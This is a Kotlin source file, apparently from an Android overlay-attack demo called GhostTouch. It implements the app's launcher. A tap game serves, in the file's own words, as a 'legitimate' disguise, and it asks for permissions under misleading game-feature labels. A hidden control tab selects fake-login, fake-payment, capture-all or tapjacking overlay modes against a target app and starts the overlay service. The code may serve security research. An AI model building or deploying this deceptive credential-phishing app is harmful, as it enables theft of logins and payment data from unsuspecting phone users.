package com.ghosttouch.attacker.ui.launcher

import android.content.Intent
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.core.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.interaction.MutableInteractionSource
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.scale
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import com.ghosttouch.attacker.service.OverlayService
import com.ghosttouch.attacker.ui.sessions.SessionListActivity
import com.ghosttouch.attacker.ui.theme.GhostColors
import com.ghosttouch.attacker.ui.theme.GhostTouchTheme
import com.ghosttouch.common.util.OverlayPermissionHelper

/**
 * Main entry point for the GhostTouch attacker demo.
 *
 * Presents two tabs:
 * 1. **Game** — A tap-counter mini game that serves as the app's "legitimate" disguise.
 *    In a real attack, this is the publicly visible functionality that justifies
 *    the app's existence on the Play Store.
 * 2. **Control** — Hidden settings panel for managing the overlay attack.
 *    Shows permission status, attack mode selection, and service controls.
 */
class LauncherActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            GhostTouchTheme {
                LauncherScreen()
            }
        }
    }
}

@Composable
fun LauncherScreen() {
    val context = LocalContext.current
    var selectedTab by remember { mutableIntStateOf(0) }

    Scaffold(
        containerColor = GhostColors.NavyBackground,
        bottomBar = {
            NavigationBar(
                containerColor = GhostColors.SlateCard,
                contentColor = GhostColors.CyanAccent
            ) {
                NavigationBarItem(
                    icon = { Icon(Icons.Default.SportsEsports, contentDescription = null) },
                    label = { Text("Game") },
                    selected = selectedTab == 0,
                    onClick = { selectedTab = 0 },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = GhostColors.CyanAccent,
                        selectedTextColor = GhostColors.CyanAccent,
                        unselectedIconColor = GhostColors.TextTertiary,
                        unselectedTextColor = GhostColors.TextTertiary,
                        indicatorColor = GhostColors.CyanAccent.copy(alpha = 0.15f)
                    )
                )
                NavigationBarItem(
                    icon = { Icon(Icons.Default.Terminal, contentDescription = null) },
                    label = { Text("Control") },
                    selected = selectedTab == 1,
                    onClick = { selectedTab = 1 },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = GhostColors.CyanAccent,
                        selectedTextColor = GhostColors.CyanAccent,
                        unselectedIconColor = GhostColors.TextTertiary,
                        unselectedTextColor = GhostColors.TextTertiary,
                        indicatorColor = GhostColors.CyanAccent.copy(alpha = 0.15f)
                    )
                )
                NavigationBarItem(
                    icon = { Icon(Icons.Default.Storage, contentDescription = null) },
                    label = { Text("Sessions") },
                    selected = selectedTab == 2,
                    onClick = {
                        context.startActivity(Intent(context, SessionListActivity::class.java))
                    },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = GhostColors.CyanAccent,
                        selectedTextColor = GhostColors.CyanAccent,
                        unselectedIconColor = GhostColors.TextTertiary,
                        unselectedTextColor = GhostColors.TextTertiary,
                        indicatorColor = GhostColors.CyanAccent.copy(alpha = 0.15f)
                    )
                )
            }
        }
    ) { padding ->
        Box(modifier = Modifier.padding(padding)) {
            when (selectedTab) {
                0 -> TapGameTab()
                1 -> ControlTab()
            }
        }
    }
}

/**
 * Tap counter mini game — the app's "legitimate" face.
 * Provides a reason for the app to exist and run in the background.
 */
/**
 * Tap game tab with integrated permission request flow.
 *
 * On first launch, shows a "game setup" card that requests all permissions
 * with game-friendly justifications. The user sees "Enable Leaderboards",
 * "Find Nearby Players", etc. — all feel natural for a mobile game.
 *
 * After permissions are granted, the tap game is fully playable.
 */
@Composable
fun TapGameTab() {
    val context = LocalContext.current
    var score by remember { mutableIntStateOf(0) }
    var highScore by remember { mutableIntStateOf(0) }
    val scale = remember { Animatable(1f) }
    var permissionsGranted by remember { mutableIntStateOf(GamePermissions.getGrantedCount(context)) }
    var showSetup by remember { mutableStateOf(GamePermissions.getPendingPermissions(context).isNotEmpty()) }

    val permissionLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        permissionsGranted = GamePermissions.getGrantedCount(context)
        showSetup = GamePermissions.getPendingPermissions(context).isNotEmpty()
    }

    LaunchedEffect(score) {
        if (score > 0) {
            scale.animateTo(1.2f, tween(50))
            scale.animateTo(1f, tween(100))
        }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
    ) {
        Text(
            "TAP RUSH",
            fontSize = 28.sp,
            fontWeight = FontWeight.Bold,
            color = GhostColors.CyanAccent,
            letterSpacing = 4.sp
        )

        Spacer(modifier = Modifier.height(8.dp))

        Text(
            "High Score: $highScore",
            fontSize = 14.sp,
            color = GhostColors.TextSecondary
        )

        // ── Game Setup Card (permission request) ──
        if (showSetup) {
            Spacer(modifier = Modifier.height(20.dp))

            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(12.dp),
                colors = CardDefaults.cardColors(
                    containerColor = GhostColors.CyanAccent.copy(alpha = 0.1f)
                )
            ) {
                Column(
                    modifier = Modifier.padding(16.dp),
                    verticalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Text(
                        "Game Setup",
                        fontWeight = FontWeight.Bold,
                        color = GhostColors.CyanAccent,
                        fontSize = 16.sp
                    )
                    Text(
                        "Enable game features for the best experience",
                        color = GhostColors.TextSecondary,
                        fontSize = 13.sp
                    )

                    Spacer(modifier = Modifier.height(4.dp))

                    GamePermissions.groups.forEach { group ->
                        val allGranted = group.permissions.all {
                            ContextCompat.checkSelfPermission(context, it) ==
                                    PackageManager.PERMISSION_GRANTED
                        }
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .background(
                                    GhostColors.SlateCard,
                                    RoundedCornerShape(8.dp)
                                )
                                .padding(horizontal = 12.dp, vertical = 10.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Icon(
                                if (allGranted) Icons.Default.CheckCircle else Icons.Default.RadioButtonUnchecked,
                                contentDescription = null,
                                tint = if (allGranted) GhostColors.CyanAccent else GhostColors.TextMuted,
                                modifier = Modifier.size(18.dp)
                            )
                            Spacer(modifier = Modifier.width(10.dp))
                            Column(modifier = Modifier.weight(1f)) {
                                Text(
                                    group.gameFeature,
                                    color = GhostColors.TextPrimary,
                                    fontSize = 13.sp,
                                    fontWeight = FontWeight.SemiBold
                                )
                                Text(
                                    group.gameDescription,
                                    color = GhostColors.TextMuted,
                                    fontSize = 11.sp
                                )
                            }
                        }
                    }

                    Spacer(modifier = Modifier.height(4.dp))

                    Button(
                        onClick = {
                            val pending = GamePermissions.getAllRuntimePermissions()
                            permissionLauncher.launch(pending)
                        },
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(8.dp),
                        colors = ButtonDefaults.buttonColors(
                            containerColor = GhostColors.CyanAccent
                        )
                    ) {
                        Text(
                            "Enable All Features",
                            color = GhostColors.TextInverted,
                            fontWeight = FontWeight.Bold
                        )
                    }

                    TextButton(
                        onClick = { showSetup = false },
                        modifier = Modifier.align(Alignment.CenterHorizontally)
                    ) {
                        Text("Skip for now", color = GhostColors.TextMuted, fontSize = 12.sp)
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(24.dp))

        // ── Tap target ──
        Box(
            modifier = Modifier
                .size(180.dp)
                .scale(scale.value)
                .clip(CircleShape)
                .background(
                    Brush.radialGradient(
                        colors = listOf(
                            GhostColors.CyanAccent,
                            GhostColors.CyanAccent.copy(alpha = 0.6f)
                        )
                    )
                )
                .clickable(
                    interactionSource = remember { MutableInteractionSource() },
                    indication = null
                ) {
                    score++
                    if (score > highScore) highScore = score
                },
            contentAlignment = Alignment.Center
        ) {
            Text(
                "$score",
                fontSize = 48.sp,
                fontWeight = FontWeight.Bold,
                color = GhostColors.TextInverted
            )
        }

        Spacer(modifier = Modifier.height(24.dp))

        OutlinedButton(
            onClick = { score = 0 },
            colors = ButtonDefaults.outlinedButtonColors(
                contentColor = GhostColors.CyanAccent
            ),
            border = ButtonDefaults.outlinedButtonBorder(enabled = true)
        ) {
            Text("Reset")
        }

        // Feature status bar
        Spacer(modifier = Modifier.height(16.dp))
        Text(
            "$permissionsGranted/${GamePermissions.groups.size} game features enabled",
            fontSize = 12.sp,
            color = GhostColors.TextMuted
        )
    }
}

/**
 * Control panel for managing the overlay attack service.
 * Shows permission status, attack mode selection, and start/stop controls.
 */
@Composable
fun ControlTab() {
    val context = LocalContext.current
    var hasOverlayPerm by remember { mutableStateOf(OverlayPermissionHelper.canDrawOverlays(context)) }
    var hasUsageStatsPerm by remember { mutableStateOf(OverlayPermissionHelper.hasUsageStatsPermission(context)) }
    var serviceRunning by remember { mutableStateOf(false) }
    var attackMode by remember { mutableStateOf(OverlayService.MODE_CAPTURE_ALL) }

    // Refresh permissions when returning to this screen
    LaunchedEffect(Unit) {
        hasOverlayPerm = OverlayPermissionHelper.canDrawOverlays(context)
        hasUsageStatsPerm = OverlayPermissionHelper.hasUsageStatsPermission(context)
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp)
    ) {
        // Header
        Text(
            "GHOST CONTROL",
            fontSize = 20.sp,
            fontWeight = FontWeight.Bold,
            color = GhostColors.CyanAccent,
            letterSpacing = 2.sp
        )

        Text(
            "Target: ${OverlayService.TARGET_PACKAGE}",
            fontSize = 12.sp,
            color = GhostColors.TextMuted
        )

        HorizontalDivider(color = GhostColors.TextMuted.copy(alpha = 0.3f))

        // Permission status
        Text(
            "PERMISSIONS",
            fontSize = 12.sp,
            fontWeight = FontWeight.Bold,
            color = GhostColors.TextSecondary,
            letterSpacing = 1.sp
        )

        PermissionCard(
            title = "Draw Over Apps",
            description = "SYSTEM_ALERT_WINDOW — Required to display overlays",
            granted = hasOverlayPerm,
            onRequestClick = {
                context.startActivity(OverlayPermissionHelper.overlaySettingsIntent(context))
            }
        )

        PermissionCard(
            title = "Usage Access",
            description = "PACKAGE_USAGE_STATS — Required to detect foreground app",
            granted = hasUsageStatsPerm,
            onRequestClick = {
                context.startActivity(OverlayPermissionHelper.usageStatsSettingsIntent())
            }
        )

        // Refresh button
        TextButton(
            onClick = {
                hasOverlayPerm = OverlayPermissionHelper.canDrawOverlays(context)
                hasUsageStatsPerm = OverlayPermissionHelper.hasUsageStatsPermission(context)
            }
        ) {
            Icon(Icons.Default.Refresh, contentDescription = null, modifier = Modifier.size(16.dp))
            Spacer(modifier = Modifier.width(4.dp))
            Text("Refresh Permission Status", fontSize = 12.sp)
        }

        HorizontalDivider(color = GhostColors.TextMuted.copy(alpha = 0.3f))

        // Attack mode selection
        Text(
            "ATTACK MODE",
            fontSize = 12.sp,
            fontWeight = FontWeight.Bold,
            color = GhostColors.TextSecondary,
            letterSpacing = 1.sp
        )

        listOf(
            Triple(OverlayService.MODE_CAPTURE_ALL, "Capture All", "Full verification — captures everything"),
            Triple(OverlayService.MODE_LOGIN, "Fake Login", "Mimics target login screen"),
            Triple(OverlayService.MODE_PAYMENT, "Fake Payment", "Mimics target payment screen"),
            Triple(OverlayService.MODE_TAPJACKING, "Tapjacking", "Transparent overlay for tap capture"),
        ).forEach { (mode, title, desc) ->
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .clickable { attackMode = mode },
                shape = RoundedCornerShape(8.dp),
                colors = CardDefaults.cardColors(
                    containerColor = if (attackMode == mode)
                        GhostColors.CyanAccent.copy(alpha = 0.15f)
                    else GhostColors.SlateCard
                ),
                border = if (attackMode == mode)
                    androidx.compose.foundation.BorderStroke(1.dp, GhostColors.CyanAccent)
                else null
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(12.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    RadioButton(
                        selected = attackMode == mode,
                        onClick = { attackMode = mode },
                        colors = RadioButtonDefaults.colors(
                            selectedColor = GhostColors.CyanAccent
                        )
                    )
                    Column(modifier = Modifier.padding(start = 8.dp)) {
                        Text(title, color = GhostColors.TextPrimary, fontWeight = FontWeight.SemiBold)
                        Text(desc, color = GhostColors.TextTertiary, fontSize = 12.sp)
                    }
                }
            }
        }

        HorizontalDivider(color = GhostColors.TextMuted.copy(alpha = 0.3f))

        // Service control
        val allPermsGranted = hasOverlayPerm && hasUsageStatsPerm

        Button(
            onClick = {
                if (serviceRunning) {
                    context.stopService(Intent(context, OverlayService::class.java))
                    serviceRunning = false
                } else {
                    val intent = Intent(context, OverlayService::class.java).apply {
                        putExtra(OverlayService.EXTRA_MODE, attackMode)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent)
                    } else {
                        context.startService(intent)
                    }
                    serviceRunning = true
                }
            },
            modifier = Modifier
                .fillMaxWidth()
                .height(52.dp),
            shape = RoundedCornerShape(8.dp),
            colors = ButtonDefaults.buttonColors(
                containerColor = if (serviceRunning) GhostColors.DangerRed
                else GhostColors.CyanAccent,
                disabledContainerColor = GhostColors.TextMuted
            ),
            enabled = allPermsGranted
        ) {
            Icon(
                if (serviceRunning) Icons.Default.Stop else Icons.Default.PlayArrow,
                contentDescription = null
            )
            Spacer(modifier = Modifier.width(8.dp))
            Text(
                if (serviceRunning) "Stop Overlay Service" else "Start Overlay Service",
                fontWeight = FontWeight.Bold
            )
        }

        if (!allPermsGranted) {
            Text(
                "Grant all permissions above to start the service",
                fontSize = 12.sp,
                color = GhostColors.WarnAmber,
                textAlign = TextAlign.Center,
                modifier = Modifier.fillMaxWidth()
            )
        }
    }
}

/**
 * Permission status card with grant button.
 */
@Composable
private fun PermissionCard(
    title: String,
    description: String,
    granted: Boolean,
    onRequestClick: () -> Unit
) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(8.dp),
        colors = CardDefaults.cardColors(containerColor = GhostColors.SlateCard)
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(12.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(
                if (granted) Icons.Default.CheckCircle else Icons.Default.Cancel,
                contentDescription = null,
                tint = if (granted) GhostColors.SuccessGreen else GhostColors.DangerRed,
                modifier = Modifier.size(24.dp)
            )
            Column(
                modifier = Modifier
                    .weight(1f)
                    .padding(horizontal = 12.dp)
            ) {
                Text(title, color = GhostColors.TextPrimary, fontWeight = FontWeight.SemiBold, fontSize = 14.sp)
                Text(description, color = GhostColors.TextTertiary, fontSize = 11.sp)
            }
            if (!granted) {
                TextButton(onClick = onRequestClick) {
                    Text("Grant", color = GhostColors.CyanAccent, fontSize = 12.sp)
                }
            }
        }
    }
}
